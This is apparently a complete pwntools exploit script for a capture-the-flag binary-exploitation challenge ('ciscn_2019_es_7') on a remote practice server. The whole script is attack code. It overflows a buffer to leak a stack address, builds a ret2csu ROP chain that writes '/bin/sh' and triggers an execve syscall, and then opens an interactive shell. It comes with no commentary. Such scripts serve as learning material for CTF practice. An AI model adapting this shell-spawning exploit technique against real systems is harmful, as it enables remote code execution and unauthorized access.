from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_2019_es_7')
p = remote('node4.buuoj.cn', 29656)
#gdb.attach(p, 'b *0x4004E9')

csu_1 = 0x40059a
csu_2 = 0x400580
ret = 0x4003a9
pop_rdi_ret = 0x4005a3
mov_execve = 0x4004E2
syscall = 0x400517

vuln = 0x4004ed

payload = b'a' * 0x10 + p64(vuln)

p.send(payload)

p.recv(0x20)
stack = u64(p.recv(8)) - ( 0x71a8 - 0x70b0 ) - 0x10
p.recv(0x8)

print('[+] stack -> {}'.format(hex(stack)))

payload = p64(ret) + b'/bin/sh\x00' + p64(csu_1) 
payload += p64(0) + p64(1) + p64(stack - 0x10) 
payload += p64(0) + p64(0) + p64(0)
payload += p64(csu_2) + p64(0) * 7
payload += p64(pop_rdi_ret) + p64(stack - 0x8)
payload += p64(mov_execve) + p64(syscall)

p.send(payload)
p.recv(0x30)

p.interactive()
